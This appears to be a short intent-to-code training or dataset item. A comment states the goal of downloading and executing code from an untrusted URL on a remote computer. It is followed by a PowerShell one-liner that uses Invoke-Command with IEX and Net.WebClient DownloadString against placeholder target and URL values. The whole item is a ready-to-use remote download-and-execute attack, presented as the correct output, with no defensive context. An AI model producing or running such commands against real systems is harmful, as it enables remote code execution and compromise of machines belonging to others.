# Natural language intent:
# Download and execute code from an untrusted URL on a remote computer.

Invoke-Command -ComputerName <TargetIP> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('<UntrustedURL>') }
